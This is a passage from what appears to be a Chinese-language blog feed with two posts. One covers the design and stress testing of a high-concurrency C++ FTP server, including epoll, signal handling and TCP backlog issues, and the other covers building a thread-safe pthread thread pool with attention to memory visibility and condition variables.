├── NetUtility.hpp</span><br><span class="line">    ├── ThreadUtility.hpp</span><br><span class="line">    └── Utility.hpp</span><br></pre></td></tr></table></figure></li></ul><h3 id="线程安全的线程池类的设计"><a href="#线程安全的线程池类的设计" class="headerlink" title="线程安全的线程池类的设计"></a>线程安全的线程池类的设计</h3><ul><li>见笔者的另一篇博文<a href="https://h-zex.github.io/2019/03/20/construct-a-thread-safe-threadpool/">Construct a Thread-Safe ThreadPool</a></li></ul><h3 id="Utility"><a href="#Utility" class="headerlink" title="Utility"></a>Utility</h3><ul><li><p>对于POSIX的 read、write等IO函数、accept等网络函数、epoll、pthread等函数创建wrap函数，用于处理各种错误，使得业务方可以简单的使用</p></li><li><p>要根据manual，对所有可能出现的errno进行处理。我的处理方法是，对于可以明确知道不应该出现的errno，一旦出现，就调用bug函数；对于EINTR，根据需求进行再次尝试或返回；对于不明确是否是合法情况的错误，输出一个warning，然后不改变errno，返回给用户；尽量使得这些wrap函数不需要返回过于复杂的信息，能返回void尽量返回void，能返回bool就不要返回int</p></li><li><p><code>ReadWithBuf</code>函数：学的是CSAPP的方法，让用户每次调用都传入一个相同的<code>ReadBuf</code>对象，在这个对象里存预读取的数据，这样子就可以每次读都读1024B（ReadBuf里面的buf的大小是1024B），从而减少read这个syscall调用的次数，可以提高效率</p></li></ul><h3 id="FTP类"><a href="#FTP类" class="headerlink" title="FTP类"></a>FTP类</h3><h4 id="Session在多线程下的线程安全的保证"><a href="#Session在多线程下的线程安全的保证" class="headerlink" title="Session在多线程下的线程安全的保证"></a>Session在多线程下的线程安全的保证</h4><ul><li><p>FTP类需要保证很重要的一点：任意一个session在任意一个时刻，只有小于等于1个线程正在handle该Session</p></li><li><p>在代码里我是这样保证的</p><ul><li><p>对于用户的cmdFd，epoll等待的事件不仅仅是<code>EPOLLIN</code>，还需要<code>EPOLLONESHOT</code>。<code>EPOLLONESHOT</code>的含义是，一旦一个Fd被从<code>epoll_wait</code>返回，那么其就不再从<code>epoll_wait</code>返回，即使有事件发生。直到用户对这个fd使用<code>EPOLL_CTL_MOD</code>调用<code>epoll_ctl</code>指示等待的事件</p><blockquote><p>EPOLLONESHOT (since Linux 2.6.2) Sets the one-shot behavior for the associated file descriptor. This means that after an event is pulled out with epoll_wait(2) the associated file descriptor is internally disabled and no other events will be reported by the epoll interface. The user must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file descriptor with a new event mask. </p></blockquote><p>从而使得，一个Session正在被handle的过程中，没有新的线程会去handle这个Session</p></li><li><p>创建新Session的函数epoll_wait、accept的函数在同一个线程，从而在创建新Session时，不会有新的线程去handle这个正在创建的Session</p></li><li><p>destroySession时，持有一个mutex，从而，即使对应的cmdFd关闭了，<strong>OS复用了这个fd</strong>，但是其创建新Session会被阻塞，从而在该Session完全destroy之前，没有新线程会handle该Session</p></li></ul></li></ul><h4 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h4><ul><li>按照CSAPP建议的6条规则，逐一介绍以下</li><li>handler要尽可能简单，比如只是设置一个flag</li><li>handler里只能调用<strong>异步信号安全</strong>的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括<code>exit</code>、<code>printf</code>等常见函数</li><li>保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno</li><li>如果访问了全局的数据结构，那么需要阻塞所有信号。因为笔者的handler中只是设置了一个flag，而对<code>bool</code>型的flag的<strong>读或写</strong>，intel保证是原子的，所以无需如此<blockquote><p>引用自<em>Intel® 64 and IA-32 Architectures Software Developer’s Manual</em> (2018 5 18), Vol.3A ch8</p><ul><li>The Intel486 processor (and newer processors since) guarantees that the following basic <strong>memory operations</strong> will always be carried out atomically(<code>atomically</code>: That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.):<ul><li><strong>Reading or writing a byte</strong></li><li>Reading or writing a word aligned on a 16-bit boundary</li><li>Reading or writing a doubleword aligned on a 32-bit boundary</li></ul></li></ul></blockquote></li><li>使用<code>volatile</code>声明flag，<code>volatile</code>要求编译器每次在代码中引用flag时，都从内存中读取该值。不过需要注意的是，有些编译器下的<code>volatile</code>并没有类似于java中的<code>volatile</code>的内存可见性的保证<blockquote><p>Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, <strong>anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f</strong>.(<a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#volatile" target="_blank" rel="noopener">引用自JSR 133 (Java Memory Model) FAQ</a>)</p></blockquote></li><li><p>使用<code>sig_atomic_t</code>声明变量。C99的<code>sig_atomic_t</code>有这么一段注释</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C99: An integer type that can be accessed as an atomic entity,</span></span><br><span class="line"><span class="comment"> * even in the presence of asynchronous interrupts.</span></span><br><span class="line"><span class="comment"> * It is not currently necessary for this to be machine-specific.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p> 并且按照intel的manual，读或写一个byte是原子的，所以笔者直接用了<code>bool</code></p></li><li><p>还有一个很重要的点，race Condition。以下代码截取自FTP class</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// make sure there is no race condition:</span></span><br><span class="line"><span class="comment">// the signal occur after check willExit and before epoll_wait</span></span><br><span class="line"><span class="comment">// then the epoll_wait may not wake up.</span></span><br><span class="line">pthreadSigmaskWrap(SIG_BLOCK, &amp;sigToBlock, &amp;oldSigSet);</span><br><span class="line"><span class="keyword">if</span> (willExit) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> waitFdCnt = epollPWaitWrap(<span class="keyword">this</span>-&gt;epollFd, evArray, evArraySize, <span class="number">-1</span>, oldSigSet);</span><br><span class="line">pthreadSigmaskWrap(SIG_SETMASK, &amp;oldSigSet);</span><br></pre></td></tr></table></figure><p>  为什么要写的这么麻烦，而不是直接使用<code>epoll_wait</code>。因为，虽然如果没有阻塞信号时，<code>epoll_wait</code>收到<code>SIGINT</code>会返回，但是，如果该信号是在检查了<code>willExit</code>标志之后、<code>epoll_wait</code>之前到来呢，那么，我们将错过这个信号——<code>epoll_wait</code>不会返回，从而没有机会去再次检查<code>willExit</code>。所以，需要在检查<code>willExit</code>与<code>epoll_wait</code>之间阻塞信号，并且要在<code>epoll_wait</code>期间不阻塞<code>SIGINT</code>，这意味着需要原子的做这件事情，这就是<code>epoll_pwait</code>帮我们做的</p><blockquote><p>ref from epoll_pwait manual</p><p>The following epoll_pwait() call:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;     ready = epoll_pwait(epfd, &amp;events, maxevents, timeout, &amp;sigmask);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>is equivalent to atomically executing the following calls:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;     <span class="keyword">sigset_t</span> origmask;</span><br><span class="line">&gt; </span><br><span class="line">&gt;     pthread_sigmask(SIG_SETMASK, &amp;sigmask, &amp;origmask);</span><br><span class="line">&gt;     ready = epoll_wait(epfd, &amp;events, maxevents, timeout);</span><br><span class="line">&gt;     pthread_sigmask(SIG_SETMASK, &amp;origmask, <span class="literal">NULL</span>);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote></li></ul><h3 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h3><h4 id="压测步骤"><a href="#压测步骤" class="headerlink" title="压测步骤"></a>压测步骤</h4><ul><li><p>笔者的压测程序使用java写的，代码在这里<a href="https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester</a></p></li><li><p>压测包括</p><ul><li>登录</li><li>列出某个目录</li><li>上传100KB的文件</li><li>根据配置，<code>sleep(HANG_TIME)</code>，在C3K～C4K的测试结果中，<code>HANG_TIME=0</code></li></ul></li><li><p>压测前，运行server的命令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ulimit -s unlimited -f unlimited -d unlimited -n unlimited </span><br><span class="line">su root</span><br><span class="line">echo 20000 &gt;  /proc/sys/net/core/somaxconn</span><br><span class="line">sudo ./FTPServer [port]  &gt; /tmp/FTPServerOutput</span><br></pre></td></tr></table></figure><ul><li><p>修改<code>somaxconn</code>是为了使得baclog足够大</p></li><li><p>将stdout重定向到<code>/tmp/FTPServerOutput</code>是为了使得错误信息清晰的显示出来</p></li><li><p>之所以需要<code>sudo</code>，是因为使用了OS的账户验证机制来实现用户登录</p></li><li><p><code>./FTPServer [port]</code>的<code>[port]</code>参数可以不指定，也就是直接<code>sudo ./FTPServer  &gt; /tmp/FTPServerOutput</code>,这样将会监听在<code>8001</code>端口</p></li></ul></li><li><p>然后运行<code>java  -ea -jar -Dexternal.config=file:/tmp/1.properties FTPServerTester-1.0-SNAPSHOT.jar</code></p><ul><li><p><code>FTPServerTester-1.0-SNAPSHOT.jar</code>在根目录的<code>test</code>目录下（不是在<code>src/test</code>的那个<code>test</code>目录）</p></li><li><p><code>/tmp/1.properties</code>是配置文件，因为需要包含测试账户信息，所以需要自己定制，样例如下</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">StressTest.TestCnt=10</span><br><span class="line">StressTest.MaxCmdConnectionCnt=1000</span><br><span class="line">StressTest.MaxThreadCnt=1024</span><br><span class="line"># the time(millisecond) to hand on the connection</span><br><span class="line">StressTest.HangTime=1000</span><br><span class="line"></span><br><span class="line"># 你运行FTPServer的host的地址</span><br><span class="line">Tester.TesterServerAddress=10.243.6.109</span><br><span class="line"></span><br><span class="line"># 你运行Tester的host地址</span><br><span class="line"># 必须保证运行server的host与运行tester的host是可以互通的</span><br><span class="line"># 包括，tester可以主动链接server，server也可以主动链接tester</span><br><span class="line">Tester.YourselfAddress=10.243.6.43</span><br><span class="line"></span><br><span class="line">Tester.ServerPort=8001</span><br><span class="line"># 系统上账户的用户名</span><br><span class="line">Tester.UserName=</span><br><span class="line"># 系统上账户的密码</span><br><span class="line">Tester.Password=</span><br><span class="line"># 这些是以逗号分隔的目录列表 </span><br><span class="line"># 必须是绝对路径</span><br><span class="line"># 这些目录数量应该&gt;=20个，越多越好，太少的话，测试会很慢</span><br><span class="line"># 因为多个用户访问少数几个目录会很慢</span><br><span class="line"># 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录</span><br><span class="line"># 如果运行在同一台机子上，测试程序会创建这些目录</span><br><span class="line">Tester.ListTestDir=/tmp/testDir_1,/tmp/testDir_2,/tmp/testDir_3,/tmp/testDir_4,/tmp/testDir_5,/tmp/testDir_6,/tmp/testDir_7,/tmp/testDir_8,/tmp/testDir_9,/tmp/testDir_10,/tmp/testDir_11,/tmp/testDir_12,/tmp/testDir_13,/tmp/testDir_14,/tmp/testDir_15,/tmp/testDir_16,/tmp/testDir_17</span><br><span class="line"># 这个目录必须是绝对路径</span><br><span class="line"># 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录</span><br><span class="line"># 如果运行在同一台机子上，测试程序会创建这些目录</span><br><span class="line">Tester.StorTestDir=/tmp/FTPSeverTesterStorDirs____23233dd22/</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="压测结果"><a href="#压测结果" class="headerlink" title="压测结果"></a>压测结果</h4><ul><li>笔者的测试与server都跑在同一台机器上</li><li>笔者在自己的机器上(Intel i7-8550U, 16G内存，没有SSD)，<code>StressTest.MaxCmdConnectionCnt</code>设为<code>10240</code>及以下时，测试可以顺利完成。并且在测试过程使用linux的<code>ftp</code>命令与server通信，是比较流畅的</li><li><p>在如下设置测试参数后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StressTest.MaxCmdConnectionCnt=10000</span><br><span class="line">StressTest.MaxThreadCnt=4024</span><br><span class="line">StressTest.HangTime=0</span><br></pre></td></tr></table></figure><p> <code>sudo watch -n 0.5 &quot;netstat -anp | grep -i &lt;PID&gt; | grep -i &quot;est&quot;  | wc -l &quot;</code>可以看到数目是3K到4K之间波动，并且测试期间手动与服务器通信是比较流畅的</p></li></ul><h3 id="出现的问题"><a href="#出现的问题" class="headerlink" title="出现的问题"></a>出现的问题</h3><ul><li><p>测试程序开50k个链接连server进行操作（50k个测试是依次提交给线程池，边提交线程池边运行），server需要openListenFd，由OS指定端口，但是在测试程序成功进行了15k多一点的测试后，server的这个openListenFd失败，errno是<code>Address already in use</code>。</p><p><strong>我猜测</strong>，可能是很多端口处于<code>TIME_WAIT</code>状态，虽然打开的socket设置了<code>SO_REUSEADDR</code>，可以绑定这些TIME_WAIT链接的端口，但是刚好，对端也是上一次那个链接的端口，这是TCP禁止的——TCP允许复用处于TIME_WAIT的端口，但是不允许新的链接与TIME_WAIT的链接的(serverIp, serverPort, serverIp, serverPort)相同（其实也不是一定禁止，TCP规范是允许有例外），所以就提示<code>Address already in use</code></p></li><li><p>server listen的端口的backlog设太小（20），测试程序开的链接数一多，就有一些链接三次握手成功，但是hang住在读取welcome信息那里，详见笔者的另一篇博文<a href="https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/">高并发情况下backlog过低出现的问题</a></p></li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li>因为使用是线程池，并且似乎一个线程不能设置另一个线程的uid（欢迎指正！），所以无法利用OS的机制实现权限控制</li><li>只有单个线程accept，可以通过linux内核3.9的一个特性<code>SO_REUSEPORT</code>来实现多线程accept，并且没有惊群、负载不均衡的问题（<a href="https://lwn.net/Articles/542629/" target="_blank" rel="noopener">The SO_REUSEPORT socket option</a>）</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;根据RFC959&lt;/li&gt;
&lt;li&gt;高并发(C3K~C4K)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;架构&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="网络编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="并发编程" scheme="https://h-zex.github.io/categories/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="高并发" scheme="https://h-zex.github.io/tags/%E9%AB%98%E5%B9%B6%E5%8F%91/"/>
    
      <category term="FTP 服务器" scheme="https://h-zex.github.io/tags/FTP-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>Construct a Thread-Safe ThreadPool</title>
    <link href="https://h-zex.github.io/2019/03/20/construct-a-thread-safe-threadpool/"/>
    <id>https://h-zex.github.io/2019/03/20/construct-a-thread-safe-threadpool/</id>
    <published>2019-03-20T01:58:41.000Z</published>
    <updated>2019-07-02T15:43:52.289Z</updated>
    
    <content type="html"><![CDATA[<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul><li>链接：<a href="https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp</a></li><li>测试代码链接：<a href="https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp" target="_blank" rel="noopener">https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp</a></li><li>代码依赖于项目中的基础设施，所以不能直接使用</li></ul><h4 id="线程安全的两个要点"><a href="#线程安全的两个要点" class="headerlink" title="线程安全的两个要点"></a>线程安全的两个要点</h4><ul><li><p>原子性：一组操作要么不执行，要么完全执行</p></li><li><p>内存可见性：一个线程对于某个对象、变量的修改对于另一个线程是否可见，什么时候可见，该数据可见时其他数据的的可见情况</p></li></ul><h4 id="使用pthread时保证内存可见性"><a href="#使用pthread时保证内存可见性" class="headerlink" title="使用pthread时保证内存可见性"></a>使用pthread时保证内存可见性</h4><ul><li><p>由于笔者对pthread的内存模型不熟悉、不清楚c++中的<code>volatile</code>语义是否编译器相关的，所以，在构造这个ThreadPool时不敢使用<code>volatile</code>等来实现内存可见性。而是通过加锁以充当内存屏障来实现——虽然性能上会受到影响，但是至少可以保证正确性</p></li><li><p>pthread创建线程时，传递的<code>start_routine</code>参数必须是static方法，这意味着，需要把ThreadPool的<code>this</code>指针传递过去。但是，一个严重的问题，<code>this</code>指针是在原线程初始化的，ThreadPool对象也是在原线程构造的，那么，如何保证新线程看到一致的、正确构造的ThreadPool对象？在java内存模型中，这是无法保证的，必须使用其他办法来保证（<code>volatile</code>、<code>final</code>、<code>AtomicReference</code>等）。笔者不清楚pthread是否可以保证传递过去的参数的内存可见性，虽然实验中，clang++7开<code>-O3</code>，测试了5k多次，在另一个线程都可以看到正确的对象，但是因为不确定这是否是编译器相关的。所以，笔者使用了一个全局mutex，充当内存屏障——每次写该变量时持有该mutex，每次读时也要持有，以保证新线程可以看到正确构造的、一致的对象</p></li><li><p>有另一个问题，mutex对象的内存可见性如何保证？按照JCIP（java concurrency in practice）的说法，即使是一个线程安全的对象，也需要被安全的发布（发布（publish）：使对象能够在当前作用域之外的代码中使用）。保护this指针的mutex是全局变量，那么我认为其可见性应该是可以保证的，因为在编译期就已经初始化完成该mutex（欢迎指正！）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_mutex_t</span> poolPtrAndSigToBlockMutex = PTHREAD_MUTEX_INITIALIZER;</span><br></pre></td></tr></table></figure><p>而对于那些是类内变量（非static）的mutex，因为每次获得threadPool对象时，都是在持有保护<code>this</code>指针的mutex时解引用<code>this</code>指针，所以我认为可以保证另一个线程可以看到完整的、一致的对象（欢迎指正！）</p></li><li><p>（2019.4.16更新）</p><ul><li>在<em>PROGRAMMING WITH POSIX THREADS</em>的3.4，有这么一段<blockquote><p>Pthreads provides a few basic rules about memory visibility. You can count on all implementations of the standard to follow these rules: </p><ol><li>Whatever memory values a thread can see when it calls pthread_create can also be seen by the new thread when it starts. Any data written to memory after the call to pthread_create may not necessarily be seen by the new thread, even if the write occurs before the thread starts. </li><li>Whatever memory values a thread can see when it unlocks a mutex, either directly or by waiting on a condition variable, can also be seen by any thread that later locks the same mutex. Again, data written after the mutex is unlocked may not necessarily be seen by the thread that locks the mutex, even if the write occurs before the lock. </li><li>Whatever memory values a thread can see when it terminates, either by cancellation, returning from its start function, or by calling pthread_exit, can also be seen by the thread that joins with the terminated thread by calling pthread_join. And, of course, data written after the thread terminates may not necessarily be seen by the thread that joins, even if the write occurs before the join. </li><li>Whatever memory values a thread can see when it signals or broadcasts a condition variable can also be seen by any thread that is awakened by that signal or broadcast. And, one more time, data written after the signal or broadcast may not necessarily be seen by the thread that wakes up, even if the write occurs before it awakens.</li></ol></blockquote></li><li>在<a href="http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_12" target="_blank" rel="noopener">The Open Group Base Specifications Issue 7, 2018 edition</a>有这么一段<blockquote><p>4.12 Memory Synchronization</p><p>Applications shall ensure that access to any memory location by more than one thread of control (threads or processes) is restricted such that no thread of control can read or modify a memory location while another thread of control may be modifying it. Such access is restricted using functions that synchronize thread execution and also synchronize memory with respect to other threads. The following functions <strong>synchronize memory</strong>(是不是就是内存屏障？) with respect to other threads:</p><p><code>fork()</code><br><code>pthread_barrier_wait()</code><br><code>pthread_cond_broadcast()</code><br><code>pthread_cond_signal()</code><br><code>pthread_cond_timedwait()</code><br><code>pthread_cond_wait()</code><br><code>pthread_create()</code><br><code>pthread_join()</code><br><code>pthread_mutex_lock()</code><br><code>pthread_mutex_timedlock()</code><br><code>pthread_mutex_trylock()</code><br><code>pthread_mutex_unlock()</code><br><code>pthread_spin_lock()</code><br><code>pthread_spin_trylock()</code><br><code>pthread_spin_unlock()</code><br><code>pthread_rwlock_rdlock()</code><br><code>pthread_rwlock_timedrdlock()</code><br><code>pthread_rwlock_timedwrlock()</code><br><code>pthread_rwlock_tryrdlock()</code><br><code>pthread_rwlock_trywrlock()</code><br><code>pthread_rwlock_unlock()</code><br><code>pthread_rwlock_wrlock()</code><br><code>sem_post()</code><br><code>sem_timedwait()</code><br><code>sem_trywait()</code><br><code>sem_wait()</code><br><code>semctl()</code><br><code>semop()</code><br><code>wait()</code><br><code>waitpid()</code></p></blockquote></li></ul></li></ul><h4 id="this指针逸出问题"><a href="#this指针逸出问题" class="headerlink" title="this指针逸出问题"></a><code>this</code>指针逸出问题</h4><ul><li>根据JCIP，逸出（escape）的含义是在对象构造完成前就发布该对象，从而另一个线程看到一个没有完全构造的对象</li><li>如果在构造函数里启动线程，那么就是典型的<code>this</code>指针逸出——在构造函数还没运行完前，另一个线程就已经看到了<code>this</code>指针，从而看到了一个没有完全构造的对象</li><li>解决方法是使用一个start函数，用户获得ThreadPool实例后，手动调用start方法，以启动工作线程</li></ul><h4 id="状态转换的证明"><a href="#状态转换的证明" class="headerlink" title="状态转换的证明"></a>状态转换的证明</h4><ul><li><p>ThreadPool需要维护自己当前处于哪一个状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NEW, RUNNING, GRACEFUL_SHUTDOWN, IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure><p>并且保证程序中只有合法的状态转移。这需要证明。</p></li><li><p>在我的实现的线程池中，状态的转换是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NEW-&gt;RUNNING-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br><span class="line">or</span><br><span class="line">NEW-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure><p>证明是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In the constructor, the state is set to NEW.</span><br><span class="line">In the start method, the state is set to RUNNING.</span><br><span class="line">In the shutdown method, the state set to GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN.</span><br><span class="line"></span><br><span class="line">proof of the state transformation safety.</span><br><span class="line">For any instance of this ThreadPool,</span><br><span class="line">the constructor run only one time,</span><br><span class="line">so for any instance, if it is not NEW state,</span><br><span class="line">it will never be NEW state.</span><br><span class="line">After the shutdown method is called,</span><br><span class="line">no other public method except destructor and getInstance can be called,</span><br><span class="line">so if it is shutdown state, it will always be shutdown state.</span><br><span class="line">Every time the state is modify, it is protected by taskQueAndStateMutex,</span><br><span class="line">so there is no thread safety problem.</span><br></pre></td></tr></table></figure></li></ul><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h4><ul><li><p>因为使用了全局变量mutex，所以这个类只能是单例模式</p></li><li><p>在java中，有一个DCL（double check locking），其代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object instance = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (instance == <span class="keyword">null</span>)</span><br><span class="line">        instance = <span class="keyword">new</span> Object();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个写法有个问题，另一个线程可能看到一个<code>instance</code>引用已经被初始化完成，但是对象构造函数还未完成的对象——因为内存重排序，编译器可以先初始化引用再完成构造函数的运行</p></li><li><p>因为不清楚pthread是否也会有这种问题，所以对于获得ThreadPool实例的<code>getInstance</code>方法，每次都要加锁，然后才检查instance指针</p></li></ul><h4 id="使用条件变量的注意事项"><a href="#使用条件变量的注意事项" class="headerlink" title="使用条件变量的注意事项"></a>使用条件变量的注意事项</h4><ul><li><p>wait Condition变量前要检查条件是否满足，否则可能出现：条件以满足，所以生产者不再notify，然后消费者就一直hang在cond wait那里</p></li><li><p>检查条件时要使用<code>while</code>而不是<code>if</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正面例子</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">not</span> satify condition) &#123;</span><br><span class="line">    cond.wait()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反面例子</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">not</span> satify condition) &#123;</span><br><span class="line">    cond.wait</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个很重要的原因：某个线程正在等待，然后被唤醒，这时候，突然一个新线程（该线程之前并没有在等待该cond）进来，拿走了资源，结果醒来的线程拿不到资源，所以应该继续等。另外wiki（<a href="https://en.wikipedia.org/wiki/Spurious_wakeup" target="_blank" rel="noopener">Spurious wakeup</a>）上还讲了另一个原因，就是说在现代处理器上，要保证没有假醒需要较高的代价。不过，JCIP（java concurrency in practice）上虽然有打比方说“因为线路故障导致烤面包机提前响起”，但是没有明确说存在这种硬件上导致的假醒</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;链接：&lt;a href=&quot;https://github.com/H-ZeX/FTP-Implement/blob/master/s
      
    
    </summary>
    
      <category term="并发编程" scheme="https://h-zex.github.io/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="原子性" scheme="https://h-zex.github.io/tags/%E5%8E%9F%E5%AD%90%E6%80%A7/"/>
    
      <category term="线程安全" scheme="https://h-zex.github.io/tags/%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/"/>
    
      <category term="线程池" scheme="https://h-zex.github.io/tags/%E7%BA%BF%E7%A8%8B%E6%B1%A0/"/>
    
